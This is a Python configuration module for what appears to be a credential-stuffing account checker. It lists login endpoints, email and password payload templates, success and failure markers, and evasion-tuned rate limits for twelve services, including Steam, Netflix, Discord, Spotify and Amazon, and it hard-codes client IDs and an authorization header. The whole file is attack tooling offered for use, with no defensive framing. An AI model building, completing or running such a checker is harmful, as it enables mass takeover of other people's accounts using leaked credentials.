
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class Platform:
    name: str
    login_url: str
    method: str = "POST"
    auth_type: str = "form"
    success_indicators: list = field(default_factory=lambda: [])
    fail_indicators: list = field(default_factory=lambda: [])
    headers: dict = field(default_factory=dict)
    payload_template: dict = field(default_factory=dict)
    rate_limit_per_sec: float = 2.0
    max_concurrent: int = 5
    timeout: int = 15
    requires_session: bool = False
    session_url: Optional[str] = None
    redirect_valid: bool = True

    def build_payload(self, email: str, password: str) -> dict:
        payload = {}
        for k, v in self.payload_template.items():
            payload[k] = v.replace("{email}", email).replace("{password}", password)
        return payload


PLATFORMS = {
    "Steam": Platform(
        name="Steam",
        login_url="https://steamcommunity.com/login/dologin/",
        auth_type="steam",
        success_indicators=[],
        fail_indicators=[],
        payload_template={},
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        rate_limit_per_sec=0.3,
        max_concurrent=1,
        timeout=20,
        requires_session=True,
        session_url="https://steamcommunity.com/login/home/?goto=",
    ),
    "Epic Games": Platform(
        name="Epic Games",
        login_url="https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token",
        auth_type="json",
        success_indicators=["access_token", "account_id", "displayName"],
        fail_indicators=["invalid_grant", "invalidCredentials", "errors"],
        payload_template={"grant_type": "password", "username": "{email}", "password": "{password}"},
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Authorization": "Basic MzQ0NmNkNzQ2MWJjNGM4MThhYmZlYzEwZGJjNTY1MTM6ZmUyYzJmZTUtM2U5OS00N2JhLTg4NTUtNTVhZjFmNzA5MjY5",
        },
        rate_limit_per_sec=3.0,
        max_concurrent=5,
    ),
    "Roblox": Platform(
        name="Roblox",
        login_url="https://auth.roblox.com/v2/login",
        auth_type="json",
        success_indicators=[".ROBLOSECURITY"],
        fail_indicators=["Incorrect username or password", "errors", "TwoStepVerification"],
        payload_template={"ctype": "Username", "cvalue": "{email}", "password": "{password}"},
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Referer": "https://www.roblox.com/",
        },
        rate_limit_per_sec=1.0,
        max_concurrent=3,
        requires_session=True,
        session_url="https://www.roblox.com/login",
    ),
    "Netflix": Platform(
        name="Netflix",
        login_url="https://www.netflix.com/fr/login",
        auth_type="form",
        success_indicators=["profile", "Sign Out", "browse"],
        fail_indicators=["Incorrect password", "incorrect", "Invalid email"],
        payload_template={"userLoginId": "{email}", "password": "{password}"},
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        rate_limit_per_sec=1.0,
        max_concurrent=2,
        timeout=25,
    ),
    "Paramount+": Platform(
        name="Paramount+",
        login_url="https://www.paramountplus.com/account/signin/",
        auth_type="form",
        success_indicators=["Sign Out", "your plan", "Manage Profile"],
        fail_indicators=["Incorrect", "error", "incorrect", "Invalid"],
        payload_template={"email": "{email}", "password": "{password}"},
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        rate_limit_per_sec=1.0,
        max_concurrent=3,
        redirect_valid=False,
    ),
    "SFR": Platform(
        name="SFR",
        login_url="https://www.sfr.fr/moncompte/connexion",
        auth_type="form",
        success_indicators=["mon-compte", "tableau-de-bord"],
        fail_indicators=["Incorrect username", "Incorrect password", "error"],
        payload_template={"username": "{email}", "password": "{password}"},
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        rate_limit_per_sec=1.0,
        max_concurrent=3,
        redirect_valid=False,
    ),
    "Spotify": Platform(
        name="Spotify",
        login_url="https://accounts.spotify.com/api/login",
        auth_type="form",
        success_indicators=["displayName"],
        fail_indicators=["Invalid password", "Invalid username", "error"],
        payload_template={"username": "{email}", "password": "{password}"},
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        rate_limit_per_sec=2.0,
        max_concurrent=5,
    ),
    "Amazon": Platform(
        name="Amazon",
        login_url="https://www.amazon.fr/ap/signin",
        auth_type="form",
        success_indicators=["your-account", "nav-tools", "sign-out"],
        fail_indicators=["incorrect", "Invalid", "error"],
        payload_template={"email": "{email}", "password": "{password}"},
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        rate_limit_per_sec=0.5,
        max_concurrent=2,
        timeout=25,
    ),
    "Discord": Platform(
        name="Discord",
        login_url="https://discord.com/api/v9/auth/login",
        auth_type="json",
        success_indicators=["token", "mfa"],
        fail_indicators=["invalid password", "Invalid Form Body", "captcha"],
        payload_template={"login": "{email}", "password": "{password}"},
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/login",
        },
        rate_limit_per_sec=2.0,
        max_concurrent=4,
    ),
    "Twitch": Platform(
        name="Twitch",
        login_url="https://passport.twitch.tv/login",
        auth_type="json",
        success_indicators=["access_token"],
        fail_indicators=["Invalid username", "Invalid password", "error_code"],
        payload_template={"username": "{email}", "password": "{password}", "client_id": "kd1unb4b3q4t1f4t7d7w86k7v7d7w86k"},
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Client-ID": "kd1unb4b3q4t1f4t7d7w86k7v7d7w86k",
        },
        rate_limit_per_sec=1.0,
        max_concurrent=3,
    ),
    "Minecraft (Microsoft)": Platform(
        name="Minecraft",
        login_url="https://login.live.com/oauth20_authorize.srf",
        auth_type="form",
        success_indicators=["access_token", "Minecraft"],
        fail_indicators=["Incorrect", "error", "Cancel"],
        payload_template={"login": "{email}", "passwd": "{password}"},
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        rate_limit_per_sec=0.5,
        max_concurrent=2,
        timeout=30,
    ),
    "Ubisoft": Platform(
        name="Ubisoft",
        login_url="https://connect.ubisoft.com/api/v1/auth/login",
        auth_type="json",
        success_indicators=["accessToken", "ticket"],
        fail_indicators=["invalid credentials", "Unauthorized", "error"],
        payload_template={"email": "{email}", "password": "{password}"},
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Ubi-AppId": "314d4fef-e568-475a-8e1d-9e7c9e7c9e7c",
        },
        rate_limit_per_sec=2.0,
        max_concurrent=4,
    ),
    "Macdo": Platform(
        name="Macdo",
        login_url="https://connexion.mcdonalds.fr/app/submit_credentials",
        auth_type="form",
        success_indicators=["accessToken", "ticket"],
        fail_indicators=["invalid credentials", "Unauthorized", "error"],
        payload_template={"login": "{email}", "password": "{password}"},
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        rate_limit_per_sec=2.0,
        max_concurrent=4,
    ),
}
